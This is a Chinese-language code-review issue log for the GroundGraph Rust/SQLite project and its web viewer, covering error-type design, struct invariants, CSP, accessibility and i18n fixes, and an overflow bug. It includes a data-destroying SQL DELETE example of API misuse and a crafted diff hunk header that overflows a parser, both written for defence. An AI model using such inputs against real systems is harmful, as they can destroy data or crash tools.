- **问题**：`pub fn connection(&self) -> &Connection` 把内部 `rusqlite::Connection` 借给任何调用方。`rusqlite::Connection::execute` / `prepare` / `query_row` 都只要求 `&self`（SQLite 自身是内部可变），因此**仅持 `&Store`（不可变借用）的调用方可以直接执行任意 `INSERT/UPDATE/DELETE`**，完全绕过 `with_write_tx` / `begin_bulk` / `commit_bulk` 的事务封装与 WAL checkpoint 调度。
- **触发场景**：`crates/groundgraph-engine/src/export.rs:54` 已经在用（虽然只是 SELECT）。但 API 一旦 `pub`，任何下游 crate（包括未来第三方）都可以 `store.connection().execute("DELETE FROM nodes WHERE …", [])` 而不被 `with_write_tx` 拦截。
- **建议**：(a) 改名为 `connection_read_only` 并在文档中明确"只允许 SELECT"；(b) 更彻底：返回一个 newtype `StoreRead<'_>`，只暴露 `prepare`/`query_map` 等只读 API；(c) 移除公共访问器，把 `export` 改成 `Store::export_table(table, dest) -> StoreResult<()>` 内置方法。

### 165. `StoreError::Sqlite` 的 `#[error("sqlite error: {0}")]` + `#[source]` 导致 source 在错误链中重复出现

> **🟡 判定：基本按设计（2026-06-13 第九轮）** — `#[error("sqlite error: {0}")]` + `#[source]` 的"双印"是 thiserror 标准权衡。**内联 `{0}` 是有意的**：decode 失败把*有意义*的消息（如 "unknown edge kind X"）包进 `rusqlite::Error`，`repositories::decode_tests` 的 8 个用例依赖 `{}` 平印能拿到该 detail。改 `#[error("sqlite error")]` 会让这些断言失败（已实测 RED 并回退），且 anyhow `{:#}` 的轻微重复在可接受范围。已加注释说明。不改。

- **位置**：`crates/groundgraph-store/src/lib.rs:41-43`
- **问题**：`#[error("sqlite error: {0}")]` 让 thiserror 把 `rusqlite::Error` 的 `Display` 拼进消息；同时 `#[source]` 又把它作为 `Error::source()` 返回。下游用 `format!("{err:#}")` 或 anyhow 链式打印时会看到 `rusqlite::Error` 的内容两次（一次在消息，一次在 cause）。对比同 enum 中 `OpenDb { path, source }`、`Migration { version, source }` 都正确地把 source 放在 `#[source]` 而**不**在 `#[error]` 中显式 `{source}` —— `Sqlite` 变体破坏了内部一致性。
- **建议**：改为 `#[error("sqlite error")]`（source 仍可通过 `Error::source()` 取到）。

### 166. 整个 engine crate 100% 用 `anyhow::Result` 替代 typed error，错误无法被程序化区分

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立但属跨切面 API 重构。引入 `EngineError` thiserror enum 并改约 30 个公共入口 + CLI/MCP 调用方错误处理，是破坏性大改，单列"engine typed-error"专项 PR；当前 anyhow 不影响运行正确性。

> **✅ 已闭环（2026-07-18，TDD）** — 引入 `groundgraph_engine::EngineError`（thiserror，`crates/groundgraph-engine/src/error.rs`）按错误来源分变体：`Store(#[from] StoreError)` / `Io{context,path,source}` / `NoWorkspace{repo_root}`（无 `.groundgraph.yaml`）/ `Config{message,path}`（坏配置、`storage.path` 的 `..` 逃逸）/ `NotFound{what}`（符号/需求/候选不在图）/ `Subprocess{tool,message}` / `Parse{what,message}` / `InvalidInput` / `Internal(#[from] anyhow::Error)`（兜底，`#[error(transparent)]` 保留 anyhow `with_context` 链使消息不退化）；配 `ErrorKind`（`UserInput`/`NotFound`/`Operational`/`Internal`）+ `EngineError::kind()`/`is_retryable()` 为 #233 退出码契约与 MCP `INVALID_PARAMS`/`INTERNAL_ERROR` 区分留 seam。两个 `#[from]`（`StoreError`、`anyhow::Error`）让公共入口体几乎不动——`StoreResult`/`anyhow::Result`/`EngineResult` 的 `?` 分别路由到 `Store`/`Internal`/identity；prelude 全部高层工作流及其 `_with_store`/`_with_policy` 变体共 60+ 个公共入口（`index_repository`/`run_search`/`compute_impact[_with_policy]`/`analyze_*`/`build_context`/`select_tests`/`slice_requirement` 等）从 `anyhow::Result` 迁到 `Result<T, EngineError>`，关键分类点显式落变体（`load_config`→NoWorkspace/Config/Io、`slice_from_store` 与 `apply_review` 缺失项→NotFound、`Store::open` 失败→Store），私有函数与底层语言 indexer 继续用 anyhow、在高层边界归 `Internal`；cli/mcp 调用方零改动（`EngineError: std::error::Error` 自动融进 anyhow，`format!("{err:#}")` 不退化）。TDD：`tests/engine_typed_error.rs` 6 项分类断言（NoWorkspace/Config/NotFound/Store + `init` 提示保留）+ `error::tests` 3 项（kind 分类 / Store 委派 retryable / anyhow→Internal 消息保留），全 workspace `fmt` / `clippy -D warnings` / `test` 全绿。

- **位置**：`crates/groundgraph-engine/src/lib.rs:80-202`（公共 re-export）+ 所有 `pub fn`（`slice_requirement`、`build_graph_view`、`analyze_questions`、`run_search`、`compute_impact`、`apply_review`、`export` 等约 30 个公共入口）
- **问题**：除 `groundgraph-store::StoreError` 是 thiserror enum 外，engine 全部公共 API 返回 `anyhow::Result<T>`。`anyhow::Error` 是 type-erased 的，调用方（CLI/MCP）只能用 `format!("{err}")` 拿字符串，**无法 match 错误种类**做差异化处理（例如"配置缺失 → 提示 init" vs "数据库损坏 → 提示重建" vs "LSP 超时 → 重试"）。MCP `tools/call` 只能把所有错误都塞进 `ToolCallResult::err(message)`，丢失了 `INVALID_PARAMS` vs `INTERNAL_ERROR` 的区分。
- **建议**：为 engine 引入一个 `EngineError` thiserror enum（至少 `NoWorkspace`、`ConfigInvalid`、`Store(StoreError)`、`IndexerFailed`、`LspTimeout`、`Io`），公共 API 改返回 `Result<T, EngineError>`。

### 167. `SliceOptions` 等 6 个 Options 结构的 `Default` 实现把 `repo_root` 设为空 `PathBuf::new()` / 空串，调用方误用 `Default::default()` 会得到永远打不开 db 的选项

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立（仅 SliceOptions）。`SliceOptions::default().repo_root` 由空 `PathBuf::new()` 改 `PathBuf::from(".")`，与同 crate `QuestionsOptions` 一致，`slice_requirement(Default)` 解析到当前目录而非 bail。新增测试 `slice_options_default_repo_root_is_current_dir_like_questions`。**dual-db 三兄弟（port/graph_equiv/route）按设计不改**：其 `source_db/target_db` 默认空路径在实际入口 `analyze_*_with_stores(&source,&target,..)` 被直接传入的 store 绕过（Default 仅供非路径字段的结构更新/测试），且 db 文件无 "." 合理默认；删 Default 会破坏 14+ 测试调用点。

- **位置**：`crates/groundgraph-engine/src/slice.rs:55-63`（`SliceOptions`：`repo_root: PathBuf::new()`、`requirement: String::new()`）；`port_coverage.rs:152-153`、`graph_equiv.rs:147-148`、`route_coverage.rs:127-128` 同样
- **问题**：`SliceOptions::default()` 的 `repo_root` 是 `PathBuf::new()`（空路径），`slice_requirement(default)` 会先 `load_config(Path::new(""))` → `bail!("no GroundGraph workspace")`。`Default` 的语义契约是"返回一个合理默认值"，而这里返回的是一个**保证不可用**的值。对比 `QuestionsOptions::default()`（questions.rs:53-60）正确地把 `repo_root` 默认为 `"."` —— 同一 crate 内的 Default 风格已不一致。
- **建议**：(a) 删除这些 Options 上的 `Default` 实现，强制构造器；(b) 或保留 `Default` 但加 `#[track_caller]` panic 提示"repo_root must be set"。

### 168. `Node`/`EdgeAssertion` 等 pub struct 全部字段 `pub`，没有构造器/Builder，外部代码可任意设置非法状态

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立。字段全 pub 使 `start<=end`、`confidence∈[0,1]` 等不变量无法由类型表达（#63 confidence NaN 的构造侧根因）。改 `pub(crate)`+校验 setter / newtype `Confidence` 是 core 破坏性 API 变更，触及所有构造点，单列"core 封装"专项。

> **✅ 已闭环（2026-07-17，TDD）** — 按判定落地 newtype 路线。新增 `groundgraph_core::Confidence`：构造即保证有限且 ∈[0,1]（`new` 沿用 #63 净化语义 NaN→1.0/越界 clamp/`-0.0` 归一；`try_new` 严格拒绝），`PartialOrd` 走 `total_cmp` 排序永不 panic，serde 仍以裸数字收发（JSON/YAML 线格式不变，反序列化即净化——手改 `candidates.yaml` 写 `confidence: 2.0`/`.nan` 在加载时折叠）。切换点：`EdgeAssertion.confidence: f32→Confidence`（store 写入 `.get()` 免再净化、读出 `Confidence::new` 保留 #63 读侧防御，proptest 生成器放宽到任意 f32 含 NaN 强化往返性质）；`BusinessCandidate.confidence: Option<f32>→Option<Confidence>`（替换 graph.rs 三处 ad-hoc clamp）；engine prelude 已导出。`Node` 侧：新增 `Node::validate()`（`start<=end`）并由 store 写入边界（`upsert_node`/`upsert_nodes_bulk`）强制拒绝，新 `StoreError::InvalidNode`。**字段保持 `pub` 的有意说明**：Node/EdgeAssertion 本质是跨 5 crate 的行 DTO（全仓 `.start_line` 等读点 500+），全私有+getter 是纯机械 churn 零行为收益；不变量改由"newtype（confidence）+ 写入边界校验（行范围）"表达，非法状态已无法进入图谱。验证：core `confidence::tests` 9 项 + `validate_*` 2 项、store `upsert_node_rejects_inverted_line_range`、engine `out_of_range_yaml_confidence_is_sanitised_at_load`，全 workspace clippy 零告警、测试全绿。

- **位置**：`crates/groundgraph-core/src/node.rs:516-550`（`Node`）、`crates/groundgraph-core/src/edge.rs:171-218`（`EdgeAssertion`）、`crates/groundgraph-core/src/evidence.rs:50-61`（`Evidence`）
- **问题**：`Node` 提供 `Node::new(id, kind)` 构造器但其余 11 个字段都是 `pub`，调用方在构造后可以任意改 `start_line = Some(u32::MAX)` / `end_line = Some(0)`（违反 `start <= end` 不变量）。`EdgeAssertion` 同样：构造器 `declared` / `fact` 设置 `confidence = 1.0`，但 `pub confidence: f32` 允许外部写入 `-5.0`、`f32::NAN`、`100.0`（前四批 #63 已记录 confidence NaN 是计算侧问题，但**这里是构造侧的根因** —— 类型本身无法表达 [0,1] 区间）。
- **建议**：(a) 字段改 `pub(crate)`，提供带校验的 setter（`with_confidence(c: f32) -> Result<Self>` 校验 `0.0..=1.0`）；(b) 或引入 newtype `Confidence(f32)` 在构造时校验。

### 169. `Store` 没有 `impl Send` / `impl Sync` 显式声明，依赖隐式语义

> **🟡 基本按设计（2026-06-13 第十二轮）** — 所述"把 `&Connection` 发到别的线程而类型系统不报错"**不成立**：`rusqlite::Connection: !Sync` ⇒ `&Connection: !Send` ⇒ 编译器已拒绝跨线程共享 store/连接（store 可 move 不可 share）。已落地两项加固：(a) `Store` doc 明确"单线程设计、`Send + !Sync`、多线程需 `Arc<Mutex<Store>>`、勿 `unsafe impl Sync`"；(b) 加编译期 `Store: Send` 静态断言防字段回归。建议中的 `PhantomData<Rc<()>>` 会误删合法的 `Send`，不采纳。验证：`cargo check -p groundgraph-store` 通过。

- **位置**：`crates/groundgraph-store/src/lib.rs:60-63`
- **问题**：`Store { conn: Connection, path: PathBuf }`。`rusqlite::Connection` 在默认 feature 下是 `Send` 但**不是 `Sync`**（SQLite 句柄要求单线程访问）。当前 GroundGraph 是单线程同步架构，所以编译通过。但 `Store` 的 `pub fn connection(&self) -> &Connection`（#163）允许调用方把 `&Connection` 发送到另一个线程后再调 `execute`（`&self` 即可），只要不跨越 `&Store` 的借用边界 —— 这违反了 SQLite 的单线程约束且 Rust 类型系统不会报错。若未来引入并行 indexer（PR 中已多次出现"并行分词"等改进），需要 `Arc<Mutex<Store>>` 或显式 `unsafe impl Sync`，但当前类型签名完全没表达这一意图。
- **建议**：(a) 在 doc-comment 中明确"Store is single-threaded by design; do not share across threads"；(b) 加 `impl !Sync for Store {}`（nightly）或 `PhantomData<Rc<()>>`；(c) 提供官方 `Arc<Mutex<Store>>` 别名。

### 170. `<script>` bundle 是渲染阻塞的，且没有 `defer`，> 1 秒的首次内容绘制回归

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。vendor `<script src>` 由 `<head>` 移到 `</body>` 前（紧邻 SS_VENDOR_SLOT/SS_DATA_SLOT，仍同步先于 boot 执行），让 markup + loading 转圈先绘制再加载 1.4MB bundle。`VENDOR_TAG` 字符串原样保留（仅移位），export 内联契约不破。验证：graph 5 单测 + 19 集成全绿。

- **位置**：`webui/index.html:100`，`webui/vendor/groundgraph-viewer.bundle.js` (1.4 MB)
- **问题**：第三方 bundle 以 `<script src=...>` 的形式加载在 `<head>` 中，且没有 `defer`。由于是经典脚本，它会阻塞 HTML 解析，因此即使背景和加载转圈应该立即绘制，它们也会被阻塞在 1.4 MB JS 解析过程之后。在 `file://` 和慢速闪存驱动器上，这种停顿显而易见。
- **建议**：添加 `defer`（或者将其移动到 `</body>` 之前），以便绘制加载 UI，然后再进行引导。

### 171. `trackFps()` 在每个动画帧都会重新安排 `requestAnimationFrame`，且没有暂停机制，隐藏标签页时的电池/性能消耗

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立（隐藏页耗电）。`trackFps` 改可恢复：`document.hidden` 时循环自退出、`fpsRunning` 防重入；新增 `visibilitychange` 监听：隐藏 `Graph.pauseAnimation()`、回前台 `resumeAnimation()` + 重启采样。验证：node 内联脚本语法检查通过。

- **位置**：`webui/index.html:499-503`
- **问题**：FPS 循环无条件地在每一帧调用 `requestAnimationFrame(loop)`。当标签页被隐藏（`document.visibilityState === 'hidden'`）时，浏览器会限制 rAF 到 ~0 fps，但调用仍然在排队，并在返回时立即执行。更糟糕的是，3d-force-graph 自身的内部 rAF 也在运行，因此当两个 rAF 消费者同时唤醒时，返回到重图标签页会产生巨大的峰值。没有暂停/恢复钩子，也没有 `visibilitychange` 监听器来停止引擎。
- **建议**：在 `visibilitychange` 时停止/启动图表引擎 + FPS 循环；在隐藏时暂停 `Graph.pauseAnimation()`。

### 172. 没有 CSP，也没有 `crossorigin`/`integrity`，在线查看器中 bundle/数据存在供应链/tamper 风险

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。`<head>` 加 CSP meta：`default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'`。`connect-src 'self'` 封死 #100 的 `?data=` 外联；`'unsafe-eval'` 为 vendored d3 力导积分器的 `new Function` 所必需（实测 bundle：6 处 `new Function`、0 处 `eval`、唯一 `blob:` 为 scheme 正则、0 Worker），其余资源（内联 JS/CSS、`data:` favicon、同源 bundle+JSON）均被精确覆盖——allowlist 精确而非放任。

- **位置**：`webui/index.html:100, 185`
- **问题**：文档完全没有 `Content-Security-Policy`（通过 `<meta http-equiv>` 设置）、没有 `integrity=""` 子资源完整性，也没有 `crossorigin`。当此 HTML 由任何 HTTP 服务器（CLI 的 `--format web` 路径，或用户提供的服务器）提供服务时，任何能够注入响应的网络/MITM/被 compromise 的 CDN 都可以静默替换 1.4 MB 的 bundle 或 JSON 提要。（与第四批 #100 SSRF 不同维度：#100 是 `?data=` 任意 URL，本条是缺 CSP/meta。）
- **建议**：通过 meta 标签发布严格的 CSP（`default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self' data:`）。

### 173. 没有 WebGL 可用性 / 上下文丢失处理 → 在无 GPU / 软件渲染环境中出现静默黑屏

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立（静默黑屏）。`boot` 前 `webglAvailable()` 探测（canvas getContext webgl2/webgl/experimental），不可用走 `showWebglError()` 可读提示而非深入 three.js 崩栈；图 canvas 加 `webglcontextlost` 监听 preventDefault + 提示，防驱动重置卡死。

- **位置**：`webui/index.html:179-191, 323-329`
- **问题**：`boot()` 假设 WebGL 起作用；`ForceGraph3D()` 在失败的 GPU 上不会抛出有用的错误。在无头/无 GPU 的办公机器、带有屏蔽 GPU 的企业虚拟桌面或禁用了 WebGL 的浏览器上，`#graph` canvas 保持黑色，加载转圈实际上隐藏了，但没有任何内容渲染，也没有面向用户的错误提示。`setupBloom()` 会吞掉 bloom 错误，但核心图失败永远不会到达那里。此外，没有 `webglcontextlost` 监听器，因此驱动程序重置会导致页面卡死。
- **建议**：在引导前检测 WebGL；如果缺少则显示空闲状态消息。添加 `webglcontextlost` 防护。

### 174. 关闭按钮和图例行没有键盘导航 / focus trap / focus ring

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立（键盘可达性）。关闭键 `<div>`→`<button aria-label>` 并 CSS 复位外观；图例行加 `role=button tabindex=0 aria-pressed` + Enter/Space keydown；邻居行同样可键盘聚焦触发；新增全局 `:focus-visible` 焦点环；面板 Esc 关闭。验证：node 内联脚本语法检查通过。

- **位置**：`webui/index.html:76, 120, 419, 449-451`
- **问题**：面板关闭按钮 `×` 是一个 `<div>`（`:120`），因此它不可聚焦，没有 `role="button"`，没有 `tabindex="0"`，没有 `aria-label`，也没有 keydown 处理程序——键盘用户无法关闭检查面板。图例切换（`:449`）同样在裸 `<div class="lg-row">` 上，没有 `role="checkbox"` / `aria-checked` / `tabindex`。任何地方都没有 `:focus-visible` 轮廓。
- **建议**：将关闭按钮设置为 `<button type="button" aria-label="Close panel" class="close">×</button>`；添加带有 `aria-pressed` 的 `tabindex="0" role="checkbox"`；添加全局 `:focus-visible { outline: 2px solid #7cc4ff; }`；在面板上添加 Esc 键处理器。

### 175. 提示、检查面板、图例内部硬编码的英文文案 → 不可翻译

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立。完整 i18n（抽 `I18N` 表、`?lang=zh` 切换、`<html lang>` 覆盖、`toLocaleString(navigator.language)`）触及 ~15 处人读字符串，属功能增量且无法在本地无浏览器环境可视验证，单列"webui i18n"专项；非缺陷/安全/可达性 bug。
>
> **✅ 已闭环（2026-07-17，P13 webui i18n）** — 抽 `I18N = { en, zh }` 文案表（42 个 key）+ `t(key,vars)`/`kindLabel()`/`loc()`，语言优先级 `?lang=zh|en` > `localStorage('groundgraph.lang')` > `navigator.language`（`zh*`→zh，其余 en）；`<html lang>`、`document.title`、OG/meta description 与数字 `toLocaleString(locale)` 随之刷新，右上角新增 `#langtoggle` 切换器，`applyLang()` 在切换/启动时重刷图例、详情面板、HUD 与 tooltip。验证：内联脚本 `node --check` 通过；CLI 钉的四个契约标记（`<!-- SS_DATA_SLOT`、`window.__SS_DATA__`、vendor bundle `<script src>`、`ForceGraph3D({ controlType: 'orbit' })`）均未改动。（`cargo test -p groundgraph-cli` 当前因仓库预存的 `groundgraph-store`↔`groundgraph-core` 字段重构未编译完成而无法运行，与本项目无关。）

- **位置**：`webui/index.html:107, 110-111, 115, 118, 121, 122, 273-277, 375, 410-412, 482`
- **问题**：尽管 `<html lang="en">`，但每一个人类可读字符串都硬编码在标记和 JS 模板字符串中。该项目的母语用户是中文（提交信息和 README 均为中文），但 UI 没有翻译钩子。结合 `toLocaleString()` 使用宿主区域设置进行数字格式化，标签和数值在不同区域设置下不一致。`<html lang>` 硬编码为 `en`，因此屏幕阅读器即使对中文用户也会以英文语音规则朗读。
- **建议**：提取一个 `I18N = {...}` 查找表，添加 `lang` 切换（例如 `?lang=zh`），使用显式区域设置 `.toLocaleString(navigator.language)`，并允许 `<html lang>` 被覆盖。

### 176. 没有 `<meta name="description">`，没有 Open Graph / Twitter 卡片，分享时预览效果差

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。`<head>` 加 description / theme-color / og:type|title|description / twitter:card / 内联 SVG `data:` favicon（离线；W3C xmlns 为标识符非抓取，符合本仓既有约定）。

- **位置**：`webui/index.html:3-6`
- **问题**：`<head>` 只有 charset、viewport 和 title。当查看器 URL 在 Slack/Twitter/LinkedIn/iMessage 中分享时（这是 CLI 的 `--format web` 单文件导出所鼓励的），预览会退回到原始域名。没有 `meta name="description"`，没有 `og:title|og:description|og:image|og:type`，没有 `twitter:card`，没有 `<link rel="icon">`，也没有 `application/ld+json`。README 明确将查看器定位为可分享的交付物，因此 SEO/预览的缺失是面向用户可见的。
- **建议**：添加描述、OG 标签、favicon 链接和 `theme-color`。

---

## Low（5 个）

### 177. `crates/groundgraph-mcp/Cargo.toml` description 说"stdio server"，但 README "MCP integration" 没明确 stdio 传输方式

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。README "MCP integration" 段补"It speaks **MCP over stdio** (the standard local-server transport — not SSE/HTTP)"，与 Cargo.toml description 一致，避免用户按 SSE 配置失败。

- **位置**：`crates/groundgraph-mcp/Cargo.toml:8`、`README.md:122-135`
- **问题**：Cargo description 是 `"GroundGraph MCP (Model Context Protocol) stdio server."`，但 README 的 MCP 集成示例只展示 jsonc 配置 + `command/args`，没说"MCP transport 是 stdio 而非 SSE/HTTP"。用户配 Cursor / Claude Desktop 时若按 SSE 配置会失败。
- **建议**：README 加一句"`groundgraph-mcp` speaks MCP over stdio (the standard local-server transport); point any stdio-capable MCP client at it."。

### 178. `find_symbols_intersecting` 参数顺序误导——`?2=start` 但 SQL 里 `?2` 用于 `end_line >= ?2`

> **✅ 已闭环（2026-06-13 第十四轮·Wave C，TDD 修复）** — 成立（可读性/防回归）。`find_symbols_intersecting` 改用命名参数 `:file`/`:start`/`:end`（`rusqlite::named_params!`），SQL 变为 `file_path = :file AND start_line <= :end AND end_line >= :start`——名字即文档，未来 patch 无法再错位 `?2`/`?3`。先补特征化测试 `find_symbols_intersecting_respects_asymmetric_bounds`（钉死不对称相交语义：上/下部分重叠命中、首/末行恰好相切命中、完全错开不命中、跨文件不命中——任何把 start/end 转置的改动都会 RED），在旧位置参数实现上确认绿后再重构，重构后仍绿；既有 `symbol_ranges_query_by_file_and_line` 不受影响。

- **位置**：`crates/groundgraph-store/src/repositories.rs:394-397`
- **问题**：绑定是 `params![file_path, start, end]`，所以 `?1=file_path, ?2=start, ?3=end`。SQL 是 `start_line <= ?3 AND end_line >= ?2`——`?3` 给 `start_line` 用、`?2` 给 `end_line` 用，顺序倒过来了。逻辑上结果正确（区间相交），但读者自然会以为 `?2` 配 `start_line`、`?3` 配 `end_line`。未来 patch 改一处不改另一处就会出 bug。
- **建议**：写成 `WHERE file_path = ?1 AND start_line <= ?2 AND end_line >= ?3`，绑定改为 `params![file_path, end, start]`。

### 179. `ensure_query_indexes` 每次 `open` 都对 7 个 index 跑 `CREATE INDEX IF NOT EXISTS`

> **🟡 判定：基本按设计（2026-06-13 第九轮，与 #207 同源）** — 每次 `open()` 跑 `CREATE INDEX IF NOT EXISTS` 是**有意的自愈**：保证旧 DB / 手工删索引 / 迁移半途的库重新打开后索引仍齐全。`IF NOT EXISTS` 在已建索引的库上近乎零成本（一次 sqlite_master 查表 + 解析），冷启动开销可忽略。属设计权衡，不改。

- **位置**：`crates/groundgraph-store/src/lib.rs:120, 129-136`
- **问题**：`Store::open` 永远调 `ensure_query_indexes`，它 `execute_batch` 整个 `002_edge_indexes.sql`——7 条 `CREATE INDEX IF NOT EXISTS`。即使索引都在，SQLite 仍要解析 SQL、查 `sqlite_master` 7 次判断存在性。对 read-only 命令（search/slice）每次启动都付这个开销。
- **建议**：先一次 `SELECT count(*) FROM sqlite_master WHERE type='index' AND name IN (...)`，只有缺失时才跑批量；或在 schema_version 表里记一个 `indexes_v2_applied` flag。

### 180. `npm` 依赖版本漂移：`package.json` 说 `esbuild ^0.28.0` 但 `build.sh` 固定为 `0.24.0`

> **🟡 基本不成立/已缓解（2026-06-13 第十二轮）** — `webui/vendor-src/build.sh` 已固定 `THREE/FORCE_GRAPH/ESBUILD` 三个精确版本并 `npm i -D esbuild@0.24.0` 强制该版本，注释明确"package.json 在 webui/ 被有意 gitignore、pin 即可复现"。所述"^0.28.0 vs 0.24.0 漂移"无实际影响：package.json 非真相源（未入库），bundle 由 build.sh 的 pin 可复现。属设计权衡，不改。

- **位置**：`webui/package.json:14`（`"esbuild": "^0.28.0"`）、`webui/vendor-src/build.sh:12`（`ESBUILD=0.24.0`）、`webui/.gitignore:4`（`package*.json` 被 git 忽略）
- **问题**：`package.json` 声明了 `^0.28.0`，但重新打包脚本固定为 `0.24.0`。因为 `package*.json` 被 git 忽略，所以检入的 bundle (`vendor/groundgraph-viewer.bundle.js`) 是在未记录的 esbuild 版本下构建的——未来的贡献者运行 `npm install` 后再运行 `build.sh` 会得到不同的 bundle（esbuild 0.24 → 0.28 改变了 IIFE 包装和 tree-shaking）。
- **建议**：在 `package.json` 和 `build.sh` 之间协调 esbuild 版本；要么将 `package*.json` 提交到 git，要么记录精确的版本。

---

## 第五批统计

**新增 50 个**（编号 131–180）：High 15 / Medium 30 / Low 5。

按模块分布：

| 模块 | 问题数 |
|---|---|
| 文档（README/CONTRIBUTING/PRD/docs/dist） | 12 |
| groundgraph-store（SQL/SQLite/迁移/FTS5/PRAGMA） | 10 |
| groundgraph-engine（性能 micro + API 设计） | 15 |
| groundgraph-core（API/类型边界） | 3 |
| groundgraph-mcp（API/Value 构造） | 5 |
| webui（前端深度） | 5 |

按主题聚类（第五批 50 个）：

| 主题 | 涉及条目 |
|---|---|
| **文档失真**（README 配置示例、性能数字、命令数、扩展名、cargo install、PRD Phase、版本声明） | #131、#132、#133、#134、#135、#146、#147、#148、#149、#150、#177 |
| **SQL/SQLite 性能与一致性**（prepare_cached 漏洞、ORDER BY file sort、孤儿清理全表扫、FTS OPTIMIZE、PRAGMA FK、死表、写放大、迁移 forward-compat、CHECK 约束、参数顺序、ensure_query_indexes） | #136、#137、#138、#139、#140、#151、#152、#153、#154、#155、#178、#179 |
| **性能 micro-optimization**（Vec<char> 分配、to_lowercase、N+1 query、format! SQL、clone 链、O(N²)、Value 构造） | #141、#142、#143、#144、#156、#157、#158、#159、#160、#161、#162 |
| **API/trait/错误设计**（resolve_storage_path 15 份、Store::connection、StoreError 消息重复、anyhow vs typed error、Default 不可用、字段全 pub、Send/Sync） | #145、#163、#164、#165、#166、#167、#168、#169 |
| **webui 前端深度**（script defer、trackFps 暂停、CSP、WebGL fallback、键盘导航、i18n、SEO） | #170、#171、#172、#173、#174、#175、#176 |

**核心结论（第五批）**：

- **文档质量与代码现实严重脱节**（#131–#135、#146–#150、#177 共 12 个）：README 用废弃字段、性能数字 README vs 白皮书相差近一倍、dist README 完全没提 SCIP、白皮书命令数 31 vs 实际 33、docs 9 vs 12 语言、cargo install 缺 --locked、MSRV 1.89 vs toolchain 1.96。**这些不是代码 bug 但对外用户影响巨大**——README 是项目的门面，数据失真直接误导新用户和下游 packager。建议建立一个 CI 检查：扫描 README/PRD/白皮书中的数字与代码实际值（命令数、语言数、性能数字）是否一致。

- **SQL 层有 5 个独立的性能/正确性缺陷**（#136–#140、#151–#155、#178–#179）：FTS5 从未 OPTIMIZE 是最严重的（多次 index 后 BM25 查询性能持续退化）；孤儿清理 N×全表扫在大型 ingest 上是分钟级开销；ORDER BY id 强制 file sort 在 search/impact 每秒千次查询上累加；缺 PRAGMA foreign_keys=ON 导致数据完整性无保证。建议把"SQL 层审计"作为季度专项。

- **性能 micro 优化空间巨大**（#141–#144、#156–#162 共 11 个）：fts_tokens 的 CJK bigram 在 spring/django 上 84k-96k symbol 各自的 body 都要走，估算 14MB 临时分配；keyword_matches 不缓存 split_identifier 在每次 search 时数十万次 String 分配；score_node 对所有节点都做 Dart 专属的 trim_end_matches(".dart")。**估算 spring/django 级仓库 search 路径上的临时分配可减少 30-50%**。

- **API 设计 4 个独立的设计层缺陷**（#163–#169）：`Store::connection()` 绕过事务封装、engine 全用 anyhow::Result 无法程序化区分错误、`SliceOptions::Default` 返回不可用值、Node/EdgeAssertion 字段全 pub 无校验。这些都不是 P0 但每个都会让未来重构困难。

- **webui 前端有 7 个独立的基础设施缺失**（#170–#176）：script 无 defer、trackFps 无暂停、无 CSP、无 WebGL fallback、无键盘导航、硬编码英文、无 SEO meta。**这是 GroundGraph 作为可分享交付物的门面**——任何一个被恶意 JSON 触发或浏览器不支持都会破坏用户体验。

**最值得优先修复的 5 个（第五批）**：
1. **#133（dist README 完全滞后）**——发布包内的 README 指导用户配置已退役的 LSP，新用户首次配置必然踩坑
2. **#138（FTS5 从未 OPTIMIZE）**——多次 index 后全文搜索性能持续退化，CI/夜间任务累积不可逆
3. **#139（缺 PRAGMA foreign_keys=ON）**——数据完整性的基础防护完全缺失
4. **#141（fts_tokens CJK bigram 临时分配）**——spring/django 中文仓库全文索引内层热点
5. **#145（resolve_storage_path 15 份语义分叉）**——engine vs MCP 已分叉到产生不同行为，是 14+1 个调用点的实际 bug

---

## 总览（#131–#180 第五批）

| 来源 | 编号范围 | 总数 | 已处理(闭环) | 活跃 |
|---|---|---|---|---|
| 第五批（本文档） | #131–#180 | 50 | 12 | 38 |

> 已闭环 12 项（修复 10 + 误报 1 + 按设计 1）见 [issues3-archive.md](issues3-archive.md)；#139、#148(余) 等延后/部分项仍计入活跃。

**累计审查历史**：

| 文件 | 编号 | 数量 | 状态 |
|---|---|---|---|
| [issues.md](issues.md) | #1–#30 | 30 | 已归档（commit `2795b35`） |
| [issues2-archive.md](issues2-archive.md) | #31–#60 | 30 | 已归档（commit `2795b35`） |
| [issues2-archive.md](issues2-archive.md) | #61–#130 中 18 项 | 18 | 已归档（2026-06-13） |
| [issues3-archive.md](issues3-archive.md) | #131–#180 中 12 项 | 12 | 已归档（2026-06-13） |
| [issues2.md](issues2.md) | #61–#130 | 53 | 活跃，待处理（含 #78 part 2） |
| **issues3.md（本文档）** | **#131–#180** | **38** | **活跃，待处理** |
| **活跃合计** | **#61–#180** | **91** | — |

### 181. `git_diff::parse_hunk_header` 的 `start + count - 1` 在 u32 边界溢出，恶意 diff 触发 panic

> **✅ 已闭环（2026-06-13 第八轮，TDD 修复）** — 成立。`new_end` 改 `start.checked_add(count - 1)?`：溢出时返回 `None`（跳过该 hunk）而非 debug panic / release wrap。新增测试 `git_diff::tests::hostile_hunk_header_does_not_overflow`（`@@ -1 +2,4294967295 @@` → `None`，正常 hunk 不受影响）。

- **位置**：`crates/groundgraph-engine/src/git_diff.rs:131-140`
- **问题**：解析 `@@ -a,b +c,d @@` 头时，`start` 与 `count` 直接 `parse::<u32>()` 无上限校验，然后 `start + count - 1`。构造 `@@ -1 +1,4294967295 @@` 即可：debug build 溢出 panic；release build 静默 wrap 成 0，下游 `new_end` 落到错误行号，impact/select-tests/trace 全部基于 diff 的命令结果失真。diff 来源包括 `git diff`、`git show`、远程 PR——完全不可信输入。
- **建议**：`start.checked_add(count.saturating_sub(1))?` 或拒绝 `count > 1_000_000`。

